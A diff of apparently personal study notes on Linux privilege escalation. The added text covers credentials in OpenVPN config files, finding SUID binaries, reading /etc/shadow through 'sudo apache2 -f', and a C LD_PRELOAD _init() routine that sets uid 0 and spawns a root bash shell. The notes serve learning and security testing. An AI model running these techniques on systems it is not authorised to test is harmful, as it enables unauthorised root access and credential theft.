@@ -14,6 +14,10 @@ Methods:
 
 1. Stored Passwords on disk or in history
 
+    Example:
+    
+    Openvpn uses config files to connect to the vpn. The config file can contain a link to files containing authentication credentials. 
+
 1. Weak file Permissions on /etc/shadow
 
     If normal users can read `/etc/shadow`, then password crackers can try to guess the password. `unshadow` is an example of this where you collect `/etc/shadow` and `/etc/passwd` and it will try to crack the password. 
@@ -22,9 +26,48 @@ Methods:
 
 1. Abusing SUID programs
 
-    `sudo -l` prints programs that the normal user can run as root. If those programs can execute other programs, those programs will be ran at root level.
+    Find SUID programs: 
+
+    1. `sudo -l` prints programs that the normal user can run as root. If those programs can execute other programs, those programs will be ran at root level.
+
+    1. List all programs on disk with perms of 4000 (suid)
+
+    ```bash
+    find / -user root -perm /4000 2>/dev/null
+    ```
+
+    Methods:
+
+    Suid programs have the potential to be abused by bad actors to escalate privileges. [GTFObins](https://gtfobins.github.io) is a resource that documents ways to misuse binaries.
     
-    Bad Programs:
-    - Editors such as vi
-    - python
-    - ...
+    1. Example of programs that could potentially spawn shells:
+        - Editors such as vi
+        - python
+        - bash (shells)
+        - nmap
+        - ...
+
+    1. Abusing file reads with Suid applications
+
+        ```bash
+        sudo apache2 -f /etc/shadow
+        ```
+
+    1. Abusing Suid applications with LD_PRELOAD
+
+    ```c
+    #include <stdio.h>
+    #include <sys/types.h>
+    #include <stdlib.h>
+
+    void _init() {
+        unsetenv("LD_PRELOAD");
+        setgid(0);
+        setuid(0);
+        system("/bin/bash");
+    }
+    ```
+
+
+
+1.  
